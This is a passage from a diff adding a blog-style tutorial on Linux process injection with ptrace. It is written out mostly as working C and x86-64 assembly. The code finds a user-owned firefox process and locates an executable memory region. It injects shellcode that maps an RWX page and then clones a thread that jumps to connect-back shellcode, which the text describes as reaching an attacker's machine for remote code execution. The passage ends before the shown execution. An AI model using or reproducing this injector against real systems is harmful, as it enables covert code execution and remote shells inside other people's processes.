+</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">strtok</span><span class="p">(</span><span class="n">needle</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">DELIM</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\t</span><span class="s">&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">//if this process is not owned by us; continue to the next process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">getuid</span><span class="p">())</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">memset</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">));</span> <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">&#34;/proc/%s/cmdline&#34;</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">readsz</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">readsz</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">//This is option used to search for a specific process in memory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&#34;firefox&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">PPROCESS</span> <span class="n">process</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPROCESS</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">memset</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">process</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">//copy the details in memory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">process</span><span class="o">-&gt;</span><span class="n">pid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">strncpy</span><span class="p">(</span><span class="n">process</span><span class="o">-&gt;</span><span class="n">proc_name</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">CMDLINESZ</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">//initiate process injection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="n">processInject</span><span class="p">(</span><span class="n">process</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">free</span><span class="p">(</span><span class="n">process</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">head</span> <span class="o">=</span> <span class="n">process</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">head</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div id="memory-enumeration" class="anchor"></div>
+<h3 class="relative group">Memory Enumeration 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#memory-enumeration" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>After a suitable process is enumerated and returned, we need to enumerate its memory map to find an address range that is executable <code>(rwp)?x</code>. This address is returned by parsing and reading the <code>/proc/&lt;pid&gt;/maps</code> file.</p>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >Code Injection happens via <code>ptrace</code> so the enumerated process map should not necessarily be writable or readable but executable for code execution.</span>
+</div>
+
+<p>The following <code>C</code> source code snippet performs this enumeration and returns the executable address range that is searched via the <code>strstr</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">PADDRESS</span> <span class="nf">enumAddress</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">CMDLINESZ</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">perms</span><span class="p">[</span><span class="mh">0x5</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">PADDRESS</span> <span class="n">paddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PADDRESS</span><span class="p">)</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">snprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="s">&#34;/proc/%d/maps&#34;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] Parsing: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] Error Opening: %s</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&#34;%lx-%*lx %s %*s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">paddr</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="n">perms</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">perms</span><span class="p">,</span> <span class="s">&#34;x&#34;</span><span class="p">)){</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">paddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">end</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div id="remote-mmap" class="anchor"></div>
+<h3 class="relative group">Remote <code>mmap</code> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#remote-mmap" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>A new allocated page in the target process is required for the following reasons:</p>
+<ul>
+<li>This will pevent overwriting existing data in the memory of the remote process that could affect the proper execution of the remote process.</li>
+<li>An <strong>executable</strong> page for code injection with no length restrictions limiting the second-staged payload.</li>
+</ul>
+<p>For the allocation of this page, we need a first staged-payload that will be executed by the remote process for allocation. The executable page/memory returned by the above <code>enumAddress</code> function will be used for the execution of the following shellcode that uses <code>mmap</code> to map a new <code>RWX</code> page.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span> <span class="mi">0x22</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">rcx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mi">0xffffffffffffffff</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">r8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">r9d</span><span class="p">,</span> <span class="no">r9d</span><span class="c">;
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">xor</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mi">0x7</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x01010101</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x01010101</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mi">0x9</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">syscall</span> <span class="c">; mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset)
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">int3</span> <span class="c">; Raise a SIGTRAP signal 
+</span></span></span></code></pre></div>
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >A backup for the data initially in that <strong>executable</strong> address is created and will be copied back after our shellcode is executed.</span>
+</div>
+
+<p>The above shellcode is written to this address and the <code>rip</code> register is modified to point to this address for shellcode execution. The <code>int3</code> instruction added at the end of the shellcode is used as an identifier to know shellcode was executed. This is because of a returned <code>SIGTRAP</code> signal a technique described at [1].</p>
+<p>The following is the code snippet for the process described above .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">		<span class="n">PADDRESS</span> <span class="n">address</span> <span class="o">=</span> <span class="n">enumAddress</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//Read OLD data from the return address above
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">dataRead</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">backup</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote_mmap</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[+] Data backup complete!</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//shellcode injection into this address.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">dataWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">remote_mmap</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote_mmap</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//update RIP to point to our &#39;shellcode&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//set registers to the new registers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//continue execution
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">//Wait for the SIGTRAP signal and check `rax` for the mapped page
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGTRAP</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[+] Mmap() execution was success!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rax</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">                <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">regs</span><span class="p">.</span><span class="n">rax</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[+] mmap&#39;d address: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">goto</span> <span class="n">shellcodeExec</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></div><p>The above code snippet with then save the returned page/address to be later used for the second-staged payload.</p>
+<div id="remote-code-execution" class="anchor"></div>
+<h3 class="relative group">Remote Code Execution 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#remote-code-execution" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>The second-staged payload <em>(emulating <code>CreateRemoteThread</code>)</em> can now be written into the newly allocated page for execution. The aim was to come up with a shellcode that would not affect the execution of the remote process at all cost and should be able to run as its own process. The <code>clone</code> syscall is interesting because it can be used to implement both <code>threads</code> (light-weight processes) and child process based on arguments pass to it i.e <code>CLONE_VM</code>.</p>
+<p>The following is part of the shellcode used to emulate <code>CreateRemoteThread</code> by spawning a remote thread that should connect back to an attacker&rsquo;s machine for <strong>Remote Code Execution</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span><span class="c">;
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">or</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">0x800100</span> <span class="c">;CLONE_UNTRACED | CLONE_VM
+</span></span></span><span class="line"><span class="cl"><span class="c"></span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">r8</span><span class="p">,</span> <span class="no">r8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mi">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">syscall</span><span class="c">; clone(unsigned long clone_flags, unsigned long newsp, void *parent_id, void *child_tid, unsigned int tid)
+</span></span></span><span class="line"><span class="cl"><span class="c"></span>	
+</span></span><span class="line"><span class="cl"><span class="no">cmp</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="err">&lt;</span><span class="no">Connect-Back</span> <span class="no">Shellcode</span> <span class="no">address</span><span class="err">&gt;</span> <span class="c">;JMP to connect-back shellcode
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">int3</span> <span class="c">;raise a SIGTRAP
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">...</span>
+</span></span></code></pre></div><p>When the above shellcode is executed, the spawned thread <em>(that see&rsquo;z a PID of 0)</em> will execute the connect back shellcode connecting to localhost at port <code>1337</code> and on the other hand, the parent proccess will raise a <code>SIGTRAP</code> letting us know that the shellcode execution was a success, therefore allowing us to restore the back&rsquo;d up data and resume execution of the remote process from <em><strong>ptrace&rsquo;s</strong></em> <code>SIGSTOP</code>.</p>
+<p>The following is the source code snippet that writes code into the new mmap&rsquo;d region and returns execution back to the remote process.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nl">shellcodeExec</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* ----- Write and Execute shellcode stored in the newly mmap&#39;d region ----*/</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dataWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] Shellcode Execution @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGTRAP</span><span class="p">)</span> <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">cleanup</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dataWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">backup</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote_mmap</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//Restore Registers and execution back to the remote process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span></code></pre></div><p>The following shows a successful execution of the injector injecting into a <code>firefox</code> process.</p>
+<p>
+
+
+
+
